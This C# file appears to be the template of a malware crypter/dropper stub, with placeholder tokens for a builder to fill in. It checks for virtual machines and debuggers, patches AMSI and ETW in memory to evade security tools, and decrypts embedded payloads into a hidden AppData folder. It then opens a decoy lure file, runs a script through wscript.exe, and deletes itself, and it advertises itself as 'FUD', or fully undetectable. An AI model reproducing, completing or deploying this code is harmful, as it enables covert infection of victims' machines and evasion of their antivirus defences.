using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

[assembly: AssemblyTitle("[[META_TITLE]]")]
[assembly: AssemblyDescription("[[META_DESC]]")]
[assembly: AssemblyCompany("[[META_COMPANY]]")]
[assembly: AssemblyProduct("[[META_PRODUCT]]")]
[assembly: AssemblyCopyright("[[META_COPYRIGHT]]")]
[assembly: AssemblyFileVersion("[[META_VERSION]]")]
[assembly: AssemblyVersion("[[META_VERSION]]")]

namespace [[N_SPACE]]
{
    class [[N_CLASS]]
    {
        static byte[] k = new byte[] { [[AES_KEY]] };
        static byte[] v = new byte[] { [[AES_IV]] };

        static string lN = "[[LURE_NAME]]";
        static string p1N = "[[P1_NAME]]";
        static string p2N = "[[P2_NAME]]";

        // Encrypted Strings for D/Invoke
        static byte[] s_nt = new byte[] { [[S_NTDLL]] };
        static byte[] s_am = new byte[] { [[S_AMSI]] };
        static byte[] s_etw = new byte[] { [[S_ETW]] };
        static byte[] s_amsb = new byte[] { [[S_AMSB]] };
        static byte[] s_k32 = new byte[] { [[S_K32]] };
        static byte[] s_vp = new byte[] { [[S_VP]] };

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate bool D_VP(IntPtr a, UIntPtr s, uint n, out uint o);

        [STAThread]
        static void Main()
        {
            if ([[OPT_VM]] && [[M_GHOST]]()) return;

            if ([[OPT_AMSI]]) {
                [[M_BLIND]]([[M_DECS]](s_etw), [[M_DECS]](s_nt), IntPtr.Size == 8 ? new byte[] { 0x48, 0x33, 0xC0, 0xC3 } : new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 });
                [[M_BLIND]]([[M_DECS]](s_amsb), [[M_DECS]](s_am), IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 });
            }

            try {
                string hD = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "[[RND_DIR]]");
                if(!Directory.Exists(hD)) {
                    Directory.CreateDirectory(hD);
                    File.SetAttributes(hD, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);
                }

                string lP = Path.Combine(hD, lN);
                string p1P = Path.Combine(hD, p1N);
                string p2P = Path.Combine(hD, p2N);

                // Resource Extractor Engine (FUD V6 - ZERO Byte Arrays in source)
                byte[] eL = [[M_LOAD_RES]]("[[RES_LURE]]");
                byte[] eP1 = [[M_LOAD_RES]]("[[RES_P1]]");
                byte[] eP2 = [[M_LOAD_RES]]("[[RES_P2]]");

                byte[] lB = [[M_DEC]](eL);
                if (lB.Length > 0) { File.WriteAllBytes(lP, lB); [[M_EX]](lP, "", true); }

                File.WriteAllBytes(p1P, [[M_DEC]](eP1));
                File.WriteAllBytes(p2P, [[M_DEC]](eP2));

                [[M_EX]]("wscript.exe", string.Format("\"{0}\"", p2P), false);

                if ([[OPT_SELF_DEL]]) {
                    string p = Process.GetCurrentProcess().MainModule.FileName;
                    [[M_EX]]("cmd.exe", "/c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + p + "\"", false);
                }
            } catch { }
        }

        private static byte[] [[M_LOAD_RES]](string n) {
            try {
                using (Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream(n)) {
                    if (s == null) return new byte[0];
                    byte[] b = new byte[s.Length];
                    s.Read(b, 0, b.Length);
                    return b;
                }
            } catch { return new byte[0]; }
        }

        static byte[] [[M_DEC]](byte[] t)
        {
            if (t.Length == 0) return t;
            using (Aes a = Aes.Create()) {
                a.Key = k; a.IV = v; a.Padding = PaddingMode.PKCS7;
                using (MemoryStream md = new MemoryStream(t))
                using (CryptoStream cd = new CryptoStream(md, a.CreateDecryptor(), CryptoStreamMode.Read))
                using (MemoryStream mp = new MemoryStream()) {
                    cd.CopyTo(mp); return mp.ToArray();
                }
            }
        }

        static string [[M_DECS]](byte[] t) {
            return System.Text.Encoding.UTF8.GetString([[M_DEC]](t));
        }

        static void [[M_EX]](string f, string a, bool v) {
            try { Process.Start(new ProcessStartInfo { FileName = f, Arguments = a, UseShellExecute = v, CreateNoWindow = !v, WindowStyle = v ? ProcessWindowStyle.Normal : ProcessWindowStyle.Hidden }); } catch { }
        }

        static bool [[M_GHOST]]() {
            try {
                // 1. Check Processor Count
                if (Environment.ProcessorCount < 2) return true;
                
                // 2. Check RAM Size (Minimum 4GB)
                long ram = 0;
                using (var searcher = new System.Management.ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")) {
                    foreach (var obj in searcher.Get()) ram = Convert.ToInt64(obj["TotalPhysicalMemory"]);
                }
                if (ram < (3.5 * 1024 * 1024 * 1024)) return true;
                
                // 3. Check Disk Size (Minimum 100GB)
                var drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (drive.TotalSize < (90L * 1024 * 1024 * 1024)) return true;

                // 4. Check for Analysis Folders
                string[] sB = { @"C:\windows\System32\Drivers\Vmmouse.sys", @"C:\windows\System32\Drivers\Vboxguest.sys" };
                foreach (string s in sB) if (File.Exists(s)) return true;

                if (Debugger.IsAttached) return true;
            } catch { }
            return false;
        }

        static IntPtr [[M_GETF]](string d, string f) {
            foreach (ProcessModule m in Process.GetCurrentProcess().Modules) {
                if (m.ModuleName.Equals(d, StringComparison.OrdinalIgnoreCase)) {
                    IntPtr bA = m.BaseAddress;
                    int pe = Marshal.ReadInt32(bA, 0x3C);
                    int opt = pe + 0x18;
                    int mag = Marshal.ReadInt16(bA, opt);
                    int exp = Marshal.ReadInt32(bA, opt + (mag == 0x010B ? 96 : 112));
                    if (exp == 0) continue;
                    
                    int nN = Marshal.ReadInt32(bA, exp + 24);
                    int aF = Marshal.ReadInt32(bA, exp + 28);
                    int aN = Marshal.ReadInt32(bA, exp + 32);
                    int aO = Marshal.ReadInt32(bA, exp + 36);
                    
                    for (int i = 0; i < nN; i++) {
                        string n = Marshal.PtrToStringAnsi((IntPtr)(bA.ToInt64() + Marshal.ReadInt32(bA, aN + i * 4)));
                        if (n == f) {
                            return (IntPtr)(bA.ToInt64() + Marshal.ReadInt32(bA, aF + Marshal.ReadInt16(bA, aO + i * 2) * 4));
                        }
                    }
                }
            }
            return IntPtr.Zero;
        }

        static void [[M_BLIND]](string fn, string d, byte[] p) {
            try {
                IntPtr pF = [[M_GETF]](d, fn); if (pF == IntPtr.Zero) return;
                IntPtr pV = [[M_GETF]]([[M_DECS]](s_k32), [[M_DECS]](s_vp)); if (pV == IntPtr.Zero) return;
                
                D_VP vp = (D_VP)Marshal.GetDelegateForFunctionPointer(pV, typeof(D_VP));
                uint oP; vp(pF, (UIntPtr)p.Length, 0x40, out oP);
                Marshal.Copy(p, 0, pF, p.Length);
                vp(pF, (UIntPtr)p.Length, oP, out oP);
            } catch { }
        }

        [[JUNK_CODE]]
    }
}
